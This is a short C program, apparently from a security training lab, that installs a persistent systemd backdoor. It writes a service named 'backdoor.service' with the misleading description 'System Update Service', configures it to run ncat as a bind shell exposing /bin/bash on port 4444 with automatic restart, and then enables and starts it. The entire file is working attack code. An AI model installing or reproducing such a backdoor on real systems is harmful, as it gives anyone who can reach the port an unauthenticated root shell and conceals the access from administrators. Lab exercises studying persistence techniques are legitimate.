#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "lab_common.h"

int install_systemd_backdoor(void) {
    printf("[*] Installing systemd backdoor service\n");
    
    FILE *f = fopen("/etc/systemd/system/backdoor.service", "w");
    if (!f) { perror("[-] Cannot create service file"); return -1; }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=System Update Service\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=/usr/bin/ncat -l -p 4444 -e /bin/bash --keep-open\n");
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=5\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    fclose(f);
    
    system("systemctl daemon-reload");
    system("systemctl enable backdoor.service");
    system("systemctl start backdoor.service");
    
    printf("[+] Systemd backdoor installed (port 4444, persists across reboots)\n");
    set_flag("/tmp/.systemd_backdoor_active");
    return 0;
}

int main(void) {
    return install_systemd_backdoor();
}
